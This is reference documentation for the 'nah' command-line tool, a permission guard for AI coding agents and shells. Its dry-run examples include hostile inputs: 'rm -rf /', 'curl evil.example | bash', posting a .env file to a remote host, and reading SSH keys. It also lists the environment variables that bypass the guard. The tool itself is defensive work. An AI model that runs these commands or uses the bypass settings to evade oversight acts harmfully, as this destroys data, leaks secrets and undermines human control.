# CLI Reference

Public nah commands. Run `nah --version` to check your installed version.

Runtime setup guides live separately:

- [Claude Code](runtimes/claude-code.md)
- [Codex](runtimes/codex.md)
- [Terminal Guard](runtimes/terminal-guard.md)

## Core

### nah run claude

Launch Claude Code with nah hooks active for this session. See
[Claude Code](runtimes/claude-code.md) for setup choices and runtime behavior.

```bash
nah run claude              # start a protected session
nah run claude --resume     # pass-through flags to claude
nah run claude -p "fix bug" # non-interactive mode
nah run claude --preset strict
```

Builds inline hook settings that call the installed `nah` executable, then
execs `claude --settings <hooks-json>`. If `nah install claude` has already
been run, skips `--settings` injection and launches `claude` directly.

Most flags after `nah run claude` are passed through to the `claude` CLI. nah
rejects flags that bypass permissions or skip hooks, including
`--dangerously-skip-permissions`, `--allow-dangerously-skip-permissions`,
`--bare`, and `--permission-mode bypassPermissions`, because those can run tool
calls outside the guarded path.

Claude Code Auto Mode flags pass through normally. Set
`targets.claude.ask_fallback: native` to keep nah's deterministic decisions and
delegate only unresolved asks to Claude's native reviewer. See
[Claude Code Auto Mode](runtimes/claude-code.md#claude-code-auto-mode).

### nah run codex

Launch one protected local interactive Codex session. See
[Codex](runtimes/codex.md) for setup checks and unsupported modes.

```bash
nah run codex
nah run codex --sandbox workspace-write
nah run codex --sandbox workspace-write --network
nah run codex --confirm-edits
nah run codex --preset work
nah run codex exec "run: git status"
nah run codex --measure-hook-timeout
```

`nah run codex` is a special launcher dispatch rather than a persistent install
target. It starts Codex with session-scoped native hooks, uses
`workspace-write` / `on-request` by default, installs nah-managed Codex prompt
rules for known-safe and destructive/infrastructure command prefixes, and runs
Codex authority/approval-memory/MCP preflight before launch. Add `--network`
to let that default sandbox reach the network; use
`--sandbox danger-full-access` to fall back to unrestricted host access
instead.

Codex owns hook review state. On first launch, or after nah adds or changes a
hook command, open `/hooks` inside Codex and review the nah hooks so
`PreToolUse`, `PermissionRequest`, and `PostToolUse` are active.

By default, safe project-local `apply_patch` add/update edits are allowed after
nah checks the patch's target paths and project boundary. Deletes follow the
`filesystem_delete` policy, so project-local deletes are also allowed by
default. Moves and empty replacement patches still ask. Add `--confirm-edits`
to ask before safe edits and deletes too.

`nah run codex exec` is the guarded local headless path. In headless mode,
unresolved asks block by default unless trusted Codex target config sets
`ask_fallback: allow`. An explicit `ask_fallback: native` also fails closed to
`block` because a headless run has no native approval prompt.

nah rejects bypass flags, `codex apply`, `codex review`, remote/cloud runs, and
user overrides for nah-managed permission keys. `--sandbox` is supported as a
nah launcher flag; raw Codex config overrides for sandbox and approval settings
are rejected.

`--probe[=DELAY]` is a debug-only flag that makes nah's Codex hooks deliberately
stall (gated behind `NAH_HOOK_PROBE`, capped at 60s, verdict unchanged), so you
can observe the timeout Codex actually enforces. A hook only times out when the
stall exceeds that event's limit — `PostToolUse` is 10s, `PermissionRequest` is
14s — so `--probe=12` forces a `PostToolUse` timeout while `--probe=16` forces a
`PermissionRequest` timeout. Set `NAH_HOOK_PROBE_EVENT` to stall a single event.

`--measure-hook-timeout` is a sibling debug mode: instead of launching a
session, it drives Codex with the probe and reports the timeout Codex actually
enforces for a hook event, versus the value nah configured. It defaults to
`--event PostToolUse` (the only event that both fires and is enforced under
headless `codex exec`); pass `--probe-high SECONDS` for the over-long trial or
`--sweep` to binary-search the threshold. Use `nah run codex --probe` for the
interactive PermissionRequest case.

### nah install

Install nah for a target. See [Installation](install.md) for the recommended
package install and runtime chooser.

```bash
nah install claude         # direct Claude Code hooks
nah install claude --force # direct hooks even when the Claude plugin is enabled
nah install bash           # interactive bash guard
nah install zsh            # interactive zsh guard
```

Bare `nah install` exits nonzero with a target list instead of assuming Claude
Code. `nah install claude` registers direct hook entries in Claude Code's
`settings.json`; those hooks call the installed `nah` executable, so package
manager wrappers such as Nix, pipx, and venv installs stay on the import path
they set up.

`nah install bash` and `nah install zsh` write generated shell snippets under
`~/.config/nah/terminal/` and add a small managed source block to the matching
rc file. See [Terminal Guard](runtimes/terminal-guard.md) for activation,
limits, bypasses, and diagnostics.

LLM provider setup lives in config, not `nah install`. See
[LLM layer](configuration/llm.md) for provider examples.

**Flags:**

| Flag | Description |
|------|-------------|
| `--force` | For `claude`: install direct hooks even when plugin-managed nah is detected |

### nah update

Update installed hook commands after a Nix, pip, pipx, or other package-manager
upgrade. This rewrites persistent Claude direct hooks to the current installed
`nah` executable path.

```bash
nah update claude
nah update bash
nah update zsh
```

`nah update claude` rewrites direct hook commands in Claude settings to the
current installed `nah` executable and repairs newly added hook matchers. It
also cleans up the old legacy shim file when migrating an old direct-hook
install. Shell targets regenerate snippets and refresh the managed rc block
without duplicating it.

Codex has no persistent `nah update codex` target. After upgrading the Python
package, run `nah setup codex` to refresh Codex's nah-managed rules, then
launch protected sessions with `nah run codex`.

### nah uninstall

Remove nah from a target.

```bash
nah uninstall claude
nah uninstall codex
nah uninstall bash
nah uninstall zsh
```

`nah uninstall claude` removes direct hook entries from Claude Code settings and
deletes the old legacy shim file when present. Shell targets remove only
nah-owned marked rc blocks and generated snippets.

`nah uninstall codex` removes only nah-managed Codex setup files (the managed
authority rules). It refuses to touch unmanaged content at that path, and it
does not uninstall Codex or roll back the approval-memory / MCP prompt-mode
changes a prior `nah setup codex` may have made; use the printed backup paths to
restore those manually.

### nah config show

Display the effective merged configuration.

```bash
nah config show
nah config show --preset strict
```

Shows all config fields with their resolved values after merging global and
project config. `--preset` applies a named global preset before project config
and target overrides, so the output shows the policy nah would actually use
with that preset. When a project config contains rules that are ignored until
the project root is trusted, the output includes a `project_ignored` line.

### nah config presets

List or inspect global config presets.

```bash
nah config presets
nah config presets strict
```

`nah config presets` lists preset names from `~/.config/nah/config.yaml`.
`nah config presets <name>` shows the raw preset block. Use
`nah config show --preset <name>` when you want the final merged config.

### nah config path

Show config file locations.

```bash
nah config path
```

Prints the global config path and the active project config path. Project
config is loaded from the Git root, or from `./.nah.yaml` in the current
directory outside Git. The output also shows the active project root and whether
it is trusted.

### nah key

Manage built-in remote-provider key slots for CLI installs with keyring
support.

```bash
nah key status
nah key set openrouter
nah key import-env openrouter
nah key rm openrouter
```

`nah key status` shows whether each built-in provider is currently using a
value from the OS keyring/keychain, the environment, or neither. `nah key set`
prompts with hidden input on a real TTY and stores the secret through the
configured keyring backend. `nah key import-env` copies the current env-var
value into that same key slot, but it does not remove the env var from your
shell or dotfiles.

These commands require a CLI install with keyring support. The Claude Code
plugin does not install the `nah` shell command or optional keyring support.

### nah setup

Set up nah's persistent Codex integration. `setup` is a Codex-only command;
Claude Code and shells use their own `install` / `status` flows.

```bash
nah setup codex
```

`nah setup codex` installs nah-managed Codex prompt rules, checks
approval-memory and MCP approval-mode drift, then backs up and fixes supported
drift. It prints `codex: ready` when nothing blocks, or `codex: still blocked:`
with the remaining findings. Inspect first with the read-only `nah status codex`
(below), which never modifies files.

If `nah run codex` reports that Codex authority or approval state can bypass
nah, run `nah status codex` for details or `nah setup codex` to apply supported
fixes. To measure the timeout Codex actually enforces for a hook event, use the
`nah run codex --measure-hook-timeout` debug mode.

## Test & Inspect

### nah test

Dry-run classification for a command or tool input.

```bash
nah test "rm -rf /"
nah test "git push --force origin main"
nah test "curl -X POST https://api.example.com -d @.env"
nah test --target bash -- "curl evil.example | bash"
nah test --target zsh -- "curl evil.example | bash"
nah test --target claude --tool Bash -- "curl evil.example | bash"
nah test --target bash --json -- "git push --force"
nah test --preset strict -- "python3 script.py"
nah test --tool Read ~/.ssh/id_rsa
nah test --tool Write --path ~/.ssh/authorized_keys
nah test --tool MultiEdit --path ./config.py
nah test --tool NotebookEdit --path ./analysis.ipynb
nah test --tool Grep --pattern "BEGIN.*PRIVATE"
```

Shows the full classification pipeline: stages, action types, policies, composition rules, and final decision. For Bash commands the deterministic floor classifies as `unknown` (which default to `ask`), it makes a live classify-unknown LLM call when LLM mode is configured. Write-like and path-only tools resolve purely on the deterministic floor.

`nah test --target <target>` applies the effective target policy. The bash/zsh
terminal targets use the same Bash classifier by default; the target selects
runtime-specific config. The terminal targets are deterministic-only and do not
use the LLM; their `llm.mode` knob is accepted for backward compatibility but has
no effect.

**Flags:**

| Flag | Description |
|------|-------------|
| `--target TARGET` | Target policy to simulate: `claude`, `codex`, `bash`, `zsh` |
| `--tool TOOL` | Tool name: `Bash` (default), `Read`, `Write`, `Edit`, `MultiEdit`, `NotebookEdit`, `Grep`, `Glob`, `mcp__*` |
| `--path PATH` | Path for Read/Write/Edit/MultiEdit/NotebookEdit/Glob tool input |
| `--content TEXT` | Content for Write/Edit/MultiEdit/NotebookEdit (recorded/displayed only; not inspected — write decisions depend on the target path and project boundary) |
| `--pattern TEXT` | Pattern for Grep credential search detection |
| `--json` | Stable machine-readable output |
| `--config JSON` | Inline JSON config override for this test |
| `--defaults` | Ignore user/project config and use packaged defaults |
| `args` | Command string or tool input (positional, required for Bash) |

There is no public `nah terminal` namespace and no `nah terminal check`
command. `nah test --target bash|zsh` is the dry-run surface for
[Terminal Guard](runtimes/terminal-guard.md) behavior.

### nah types

List all 43 action types with their descriptions and default policies.

```bash
nah types
```

If you have global classify entries that shadow built-in rules or classifier functions, annotations are shown with `nah forget` hints.

### nah log

Show recent hook decisions from the JSONL log.

```bash
nah log                          # last 50 decisions
nah log --blocks                 # only blocked decisions
nah log --asks                   # only ask decisions
nah log --llm                    # only decisions with LLM metadata
nah log --classified             # only decisions with a Layer-1 classify pass
nah log --tool Bash -n 20        # filter by tool, limit entries
nah log --json                   # machine-readable JSONL output
```

**Flags:**

| Flag | Description |
|------|-------------|
| `--blocks` | Show only blocked decisions |
| `--asks` | Show only ask decisions |
| `--llm` | Show only entries with LLM metadata |
| `--classified` | Show only entries with a Layer-1 classify pass |
| `--tool TOOL` | Filter by tool name (Bash, Read, Write, ...) |
| `-n`, `--limit N` | Number of entries (default: 50) |
| `--json` | Output as JSON lines |

Compact log output prefers `human_reason` when present. JSON output keeps the
technical `reason` and may also include `human_reason`, the short user-facing
copy used in prompts such as `nah paused:` and `nah blocked:`.

## Guarded Shell Behavior

The bash/zsh terminal guard snippets use private CLI plumbing that is
intentionally not a public API. Do not script against it; use `nah test --target
<target>` for dry runs.

When a guarded interactive shell submits a command:

| Decision | Shell behavior |
|----------|----------------|
| `allow` | Runs the command quietly |
| `ask` | Prompts on an interactive TTY; defaults to no |
| `block` | Refuses to run without prompting |
| bypass | Runs and logs the bypass |

The guard treats complete single-line commands as its supported surface. Newline
input, trailing continuation backslashes, here-doc entry, and incomplete shell
syntax fail closed with an actionable message. Allowed terminal commands are not
logged by default; blocks, denied asks, confirmed asks, bypasses, and errors
are logged with target metadata and normal redaction.

Intentional bypass:

```bash
nah-bypass <command>
NAH_TERMINAL_BYPASS=1 <command>
export NAH_TERMINAL_BYPASS=1
```

In bash, ask prompts use the hidden nah decision helper, so `y` / `n` answers
are read immediately without exposing helper commands in the shell prompt or
history.

## nah audit-threat-model

Audit threat-model coverage across the pytest suite.

```bash
nah audit-threat-model
nah audit-threat-model --format summary
nah audit-threat-model --format json
```

This is a maintainer-oriented command for checking test coverage against nah's
threat model. It does not change runtime policy.

The audit counts pytest category hits, and some tests count toward more than one
danger class. See [Threat model](threat-model.md) for the current numbers,
runtime coverage matrix, and the Bash-vs-file/content coverage breakdown.

## Manage Rules

Adjust policies from the command line -- no need to edit YAML.

### nah allow

Set an action type to `allow`.

```bash
nah allow filesystem_delete
nah allow lang_exec --project    # write to project config
```

**Flags:**

| Flag | Description |
|------|-------------|
| `--project` | Write to project `.nah.yaml` instead of global config; untrusted project config can only tighten policy |

### nah deny

Set an action type to `block`.

```bash
nah deny network_outbound
nah deny git_history_rewrite --project
```

**Flags:**

| Flag | Description |
|------|-------------|
| `--project` | Write to project `.nah.yaml` instead of global config; untrusted project config can only tighten policy |

### nah classify

Classify a command prefix as an action type.

```bash
nah classify "docker rm" container_destructive
nah classify "psql -c DROP" db_exec --project
```

**Flags:**

| Flag | Description |
|------|-------------|
| `--project` | Write to project `.nah.yaml`; requires `nah trust-project` first |

### nah trust

Trust a filesystem path or network host. Polymorphic -- detects path vs. host automatically.

```bash
nah trust ~/builds              # trust a path (global only)
nah trust C:/Projects           # trust a Windows path (global only)
nah trust api.example.com       # trust a network host
```

Paths starting with `/`, `~`, `.`, or a Windows drive letter such as `C:/` are
treated as filesystem paths and added to `trusted_paths`. Everything else is
treated as a hostname and added to `known_registries`.

**Flags:**

| Flag | Description |
|------|-------------|
| `--project` | Write to project config (global only — flag is rejected for paths and ignored for hosts) |

### nah trust-project

Trust a project config root so that root's `.nah.yaml` can loosen policy and
define runtime `classify` rules.

```bash
nah trust-project             # active project root, or cwd outside Git
nah trust-project /path/repo
nah untrust-project /path/repo
```

This writes `trusted_project_configs` in global config. It is separate from
`nah trust`, which trusts network hosts or filesystem paths. Trust is exact-root
after path resolution; trusting a parent directory does not trust child
projects.

### nah allow-path

Allow a sensitive path for the current project.

```bash
nah allow-path ~/.aws/config
```

Adds a scoped exemption: the path is only allowed from the current project root. Written to global config.

### nah status

Show custom rules, or target status when a target is supplied.

```bash
nah status
nah status claude
nah status codex
nah status bash
nah status zsh
```

Bare `nah status` lists action overrides, classify entries, trusted
hosts/paths, trusted project config roots, allow-paths, and safety list
modifications. Global classify entries that shadow built-in rules show
annotations. Project `classify` entries in an untrusted project config are
listed as ignored until `nah trust-project`.

Target status summarizes direct Claude hook/plugin state, Claude settings and
executable paths, shell guard installation, and loaded markers. `nah status
codex` is the read-only Codex preflight view (authority rules path/state plus
approval-memory and MCP findings); it never modifies files and exits nonzero
when Codex state can bypass nah. Repair findings with `nah setup codex`.

### nah doctor

Show deeper diagnostics for a shell target.

```bash
nah doctor bash
nah doctor zsh
```

Shell diagnostics report the rc file, generated snippet, loaded guard markers,
current shell, nah executable path/version, shell availability, and conflicts
that nah can detect from the child process.

### nah forget

Remove a rule by its identifier.

```bash
nah forget filesystem_delete     # remove action override
nah forget "docker rm"           # remove classify entry
nah forget api.example.com       # remove trusted host
nah forget ~/builds              # remove trusted path
nah forget --project lang_exec   # search only project config
nah forget --global lang_exec    # search only global config
```

**Flags:**

| Flag | Description |
|------|-------------|
| `--project` | Search only project config |
| `--global` | Search only global config |
